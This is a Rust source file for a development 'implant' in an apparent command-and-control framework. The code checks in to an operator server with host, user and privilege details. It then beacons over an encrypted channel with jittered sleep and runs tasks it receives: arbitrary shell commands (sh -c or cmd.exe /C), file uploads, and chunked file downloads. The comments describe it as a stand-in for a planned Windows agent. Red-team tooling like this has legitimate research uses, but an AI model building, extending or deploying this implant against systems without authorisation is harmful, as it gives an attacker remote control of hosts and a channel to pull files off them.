//! Std-based dev implant. This is NOT the Windows PIC agent — it exists to
//! exercise the full encrypted beacon loop on the development host (macOS/Linux/Windows)
//! so the protocol + server can be validated end-to-end before the PIC port.
//!
//! Loop:  check-in (SessionInfo)  ->  every `sleep_seconds`: send last cycle's
//! task responses, receive this cycle's tasks, execute them.

use std::io::Read;
use std::path::{Path, PathBuf};
use std::time::Duration;

use nyx_protocol::{
    encode_frame, open_frame, parse_frame, wire::Writer, Command, ImplantKeypair, Response,
    SessionInfo, Task, TaskResponse,
};

pub struct Config {
    /// e.g. `http://127.0.0.1:8443`
    pub server_url: String,
    pub server_pub: [u8; 32],
    pub sleep_seconds: u32,
    pub jitter_pct: u8,
    /// Root directory for `Upload` (writes) and `Download` (reads). Remote paths
    /// are resolved relative to this and confined within it (no absolute paths,
    /// no `..` traversal) so the dev agent can't escape its sandbox.
    pub work_dir: PathBuf,
}

pub fn run(cfg: Config) -> anyhow::Result<()> {
    let kp = ImplantKeypair::generate();
    let key = kp.session_key(&cfg.server_pub);
    let pubkey = kp.public_bytes();
    let beacon_id: u32 = rand::random();

    let info = SessionInfo {
        beacon_id,
        hostname: hostname(),
        username: username(),
        os: os_string(),
        arch: arch_code(),
        pid: std::process::id(),
        is_admin: is_admin(),
    };

    // ---- check-in (retry until the server accepts us) ----------------------
    let mut counter = 0u64;
    let mut w = Writer::new();
    info.encode(&mut w);
    let info_plain = w.into_bytes();
    loop {
        let frame = encode_frame(&pubkey, counter, &key, &info_plain);
        counter += 1;
        match ureq::post(&format!("{}/beacon", cfg.server_url)).send_bytes(&frame) {
            Ok(_) => break,
            Err(e) => {
                tracing::warn!(?e, "check-in failed; retrying");
                std::thread::sleep(Duration::from_secs(2));
            }
        }
    }
    tracing::info!(beacon_id, "check-in accepted");

    // ---- beacon loop -------------------------------------------------------
    let mut pending_responses: Vec<TaskResponse> = Vec::new();
    loop {
        std::thread::sleep(jitter_sleep(cfg.sleep_seconds, cfg.jitter_pct));

        let frame = encode_frame(
            &pubkey,
            counter,
            &key,
            &TaskResponse::encode_vec(&pending_responses),
        );
        counter += 1;
        pending_responses.clear();

        let resp = match ureq::post(&format!("{}/beacon", cfg.server_url)).send_bytes(&frame) {
            Ok(r) => r,
            Err(e) => {
                tracing::warn!(?e, "beacon POST failed");
                continue;
            }
        };

        let mut body = Vec::new();
        resp.into_reader().read_to_end(&mut body)?;

        let raw = match parse_frame(&body) {
            Ok(r) => r,
            Err(e) => {
                tracing::warn!(?e, "bad reply frame");
                continue;
            }
        };
        let plaintext = match open_frame(&key, &raw) {
            Ok(p) => p,
            Err(_) => {
                tracing::warn!("server reply decryption failed");
                continue;
            }
        };
        let tasks = Task::decode_vec(&plaintext)?;

        for t in tasks {
            if matches!(t.command, Command::Exit) {
                tracing::info!("Exit task received; shutting down");
                return Ok(());
            }
            // A task may yield multiple responses (e.g. a streamed Download ->
            // many FileChunks); each carries the same task id.
            for response in execute(t.command, &cfg.work_dir) {
                pending_responses.push(TaskResponse {
                    task_id: t.task_id,
                    response,
                });
            }
        }
    }
}

/// Execute a command, returning zero or more responses. A `Download` streams
/// multiple `FileChunk`s; everything else yields one response. The beacon loop
/// tags each returned response with the originating task id.
fn execute(cmd: Command, work_dir: &Path) -> Vec<Response> {
    match cmd {
        Command::Ping => vec![Response::Ok],
        Command::Shell { args } => vec![run_shell(&args)],
        // The dev agent ignores dynamic sleep re-tasking (interval is fixed at start).
        Command::Sleep { .. } => vec![Response::Ok],
        Command::Upload { name, data } => vec![do_upload(work_dir, &name, &data)],
        Command::Download { path } => do_download(work_dir, &path),
        Command::Exit => vec![Response::Ok],
    }
}

fn run_shell(args: &str) -> Response {
    #[cfg(unix)]
    let (prog, flag) = ("sh", "-c");
    #[cfg(windows)]
    let (prog, flag) = ("cmd.exe", "/C");
    match std::process::Command::new(prog).arg(flag).arg(args).output() {
        Ok(out) => {
            let mut buf = out.stdout;
            buf.extend_from_slice(&out.stderr);
            Response::Output(buf)
        }
        Err(e) => Response::Err(e.to_string()),
    }
}

/// Largest `FileChunk` payload the dev agent emits (mirrors a typical beacon MTU).
const CHUNK: usize = 65_536;

fn do_upload(work_dir: &Path, name: &str, data: &[u8]) -> Response {
    match safe_resolve(work_dir, name) {
        Err(e) => Response::Err(e),
        Ok(path) => {
            if let Some(parent) = path.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            match std::fs::write(&path, data) {
                Ok(_) => Response::Ok,
                Err(e) => Response::Err(e.to_string()),
            }
        }
    }
}

fn do_download(work_dir: &Path, path: &str) -> Vec<Response> {
    let resolved = match safe_resolve(work_dir, path) {
        Err(e) => return vec![Response::Err(e)],
        Ok(p) => p,
    };
    let data = match std::fs::read(&resolved) {
        Ok(d) => d,
        Err(e) => return vec![Response::Err(e.to_string())],
    };
    let name = Path::new(path)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or(path)
        .to_string();
    let mut chunks = Vec::new();
    let mut seq = 0u32;
    let mut i = 0;
    while i < data.len() {
        let end = (i + CHUNK).min(data.len());
        let eof = u8::from(end == data.len());
        chunks.push(Response::FileChunk {
            name: name.clone(),
            seq,
            eof,
            data: data[i..end].to_vec(),
        });
        seq += 1;
        i = end;
    }
    if chunks.is_empty() {
        // An empty file still gets a single (empty) chunk so the operator sees EOF.
        chunks.push(Response::FileChunk {
            name,
            seq: 0,
            eof: 1,
            data: Vec::new(),
        });
    }
    chunks
}

/// Resolve a remote path under `work_dir`, refusing absolute paths and `..`
/// components so uploads/downloads cannot escape the sandbox.
fn safe_resolve(work_dir: &Path, remote: &str) -> Result<PathBuf, String> {
    let p = Path::new(remote);
    if p.is_absolute() {
        return Err("absolute paths are not allowed".into());
    }
    if p
        .components()
        .any(|c| matches!(c, std::path::Component::ParentDir))
    {
        return Err("`..` traversal is not allowed".into());
    }
    Ok(work_dir.join(p))
}

fn jitter_sleep(seconds: u32, jitter_pct: u8) -> Duration {
    let base = seconds.max(1) as i64;
    if jitter_pct == 0 {
        return Duration::from_secs(base as u64);
    }
    let max_jitter = base * jitter_pct as i64 / 100;
    let span = (2 * max_jitter + 1) as u64;
    // offset in [-max_jitter, +max_jitter]
    let offset = (rand::random::<u64>() % span) as i64 - max_jitter;
    let secs = (base + offset).max(1) as u64;
    Duration::from_secs(secs)
}

fn hostname() -> String {
    std::env::var("HOSTNAME")
        .or_else(|_| std::env::var("COMPUTERNAME"))
        .unwrap_or_else(|_| "host".into())
}

fn username() -> String {
    std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "user".into())
}

fn os_string() -> String {
    #[cfg(target_os = "macos")]
    {
        "macOS".into()
    }
    #[cfg(target_os = "linux")]
    {
        "Linux".into()
    }
    #[cfg(target_os = "windows")]
    {
        "Windows".into()
    }
    #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
    {
        "unknown".into()
    }
}

fn arch_code() -> u8 {
    #[cfg(target_arch = "x86_64")]
    {
        0
    }
    #[cfg(target_arch = "aarch64")]
    {
        1
    }
    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    {
        2
    }
}

fn is_admin() -> u8 {
    let u = std::env::var("USER").unwrap_or_default();
    u8::from(u == "root")
}
